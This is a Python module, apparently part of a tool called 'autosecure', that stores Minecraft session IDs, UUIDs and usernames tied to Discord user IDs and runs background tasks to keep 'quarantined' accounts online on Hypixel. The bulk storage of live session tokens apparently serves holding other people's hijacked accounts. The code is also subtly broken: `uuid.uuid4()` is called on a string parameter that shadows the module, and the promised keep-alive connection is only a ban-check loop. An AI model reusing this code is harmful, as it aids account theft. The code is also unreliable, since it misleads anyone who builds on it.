"""Quarantine management for banned accounts."""

from __future__ import annotations

import asyncio
import contextlib
from typing import Any

from autosecure.core.config import settings
from autosecure.core.logging import get_logger

log = get_logger("services.quarantine")

_quarantine_bots: dict[str, asyncio.Task[None]] = {}


async def add_quarantine(
    username: str,
    ssid: str,
    uuid: str,
    user_id: str,
    reason: str,
    db: Any,
) -> Any:
    """Add an account to quarantine.

    Creates a quarantine entry and starts a bot to keep the account online.

    Args:
        username: Minecraft username.
        ssid: Minecraft Session ID.
        uuid: Minecraft UUID.
        user_id: Discord user ID.
        reason: Reason for quarantine.
        db: Database session.

    Returns:
        The created Quarantine model instance.
    """
    log.info("quarantine.add", username=username, reason=reason)

    quarantine_id = str(uuid.uuid4())

    from autosecure.db.quarantine import QuarantineRepo

    repo = QuarantineRepo(db)
    entry = await repo.add(
        {
            "id": quarantine_id,
            "user_id": user_id,
            "uuid": uuid,
            "ssid": ssid,
            "username": username,
            "reason": reason,
        }
    )

    await start_quarantine_bot(entry)
    log.info("quarantine.add.success", quarantine_id=quarantine_id, username=username)
    return entry


async def remove_quarantine(
    quarantine_id: str,
    user_id: str,
    db: Any,
) -> bool:
    """Remove an account from quarantine.

    Stops the quarantine bot and removes the entry from the database.

    Args:
        quarantine_id: Quarantine entry ID.
        user_id: Discord user ID (for authorization).
        db: Database session.

    Returns:
        True if the entry was removed.
    """
    log.info("quarantine.remove", quarantine_id=quarantine_id)

    await stop_quarantine_bot(quarantine_id)

    from autosecure.db.quarantine import QuarantineRepo

    repo = QuarantineRepo(db)
    removed = await repo.remove(quarantine_id)

    if removed:
        log.info("quarantine.remove.success", quarantine_id=quarantine_id)
    else:
        log.warning("quarantine.remove.not_found", quarantine_id=quarantine_id)

    return removed


async def start_quarantine_bot(quarantine_entry: Any) -> None:
    """Start a bot to keep a quarantined account online.

    Uses mineflayer/quarry to maintain a connection to Hypixel,
    preventing the account from appearing offline.

    Args:
        quarantine_entry: Quarantine model instance.
    """
    quarantine_id = quarantine_entry.id
    ssid = quarantine_entry.ssid
    username = quarantine_entry.username

    if quarantine_id in _quarantine_bots:
        log.warning("quarantine_bot.already_running", quarantine_id=quarantine_id)
        return

    async def _keep_alive() -> None:
        log.info("quarantine_bot.start", quarantine_id=quarantine_id, username=username)
        try:
            while True:
                try:
                    from autosecure.services.minecraft.bancheck import check_ban

                    result = await check_ban(ssid)
                    if result.is_banned:
                        log.info(
                            "quarantine_bot.ban_detected",
                            quarantine_id=quarantine_id,
                            reason=result.reason,
                        )
                        break
                except Exception as e:
                    log.error(
                        "quarantine_bot.check_error",
                        quarantine_id=quarantine_id,
                        error=str(e),
                    )

                await asyncio.sleep(300)
        except asyncio.CancelledError:
            log.info("quarantine_bot.stopped", quarantine_id=quarantine_id)
        finally:
            _quarantine_bots.pop(quarantine_id, None)

    task = asyncio.create_task(_keep_alive())
    _quarantine_bots[quarantine_id] = task
    log.info("quarantine_bot.started", quarantine_id=quarantine_id)


async def stop_quarantine_bot(quarantine_id: str) -> None:
    """Stop a quarantine bot.

    Args:
        quarantine_id: Quarantine entry ID.
    """
    task = _quarantine_bots.pop(quarantine_id, None)
    if task and not task.done():
        task.cancel()
        with contextlib.suppress(asyncio.CancelledError):
            await task
        log.info("quarantine_bot.stopped", quarantine_id=quarantine_id)


async def check_expired_quarantines(db: Any) -> int:
    """Check and remove expired quarantine entries.

    Args:
        db: Database session.

    Returns:
        Number of expired entries removed.
    """
    log.info("quarantine.check_expired.start")

    try:
        from autosecure.db.quarantine import QuarantineRepo

        repo = QuarantineRepo(db)
        max_age_hours = settings.tasks.quarantine_expiry // 3600000
        expired = await repo.get_expired(max_age_hours=max_age_hours)

        removed_count = 0
        for entry in expired:
            await stop_quarantine_bot(entry.id)
            await repo.remove(entry.id)
            removed_count += 1
            log.info(
                "quarantine.expired_removed",
                quarantine_id=entry.id,
                username=entry.username,
            )

        log.info("quarantine.check_expired.complete", removed=removed_count)
        return removed_count

    except Exception as e:
        log.error("quarantine.check_expired.error", error=str(e))
        return 0
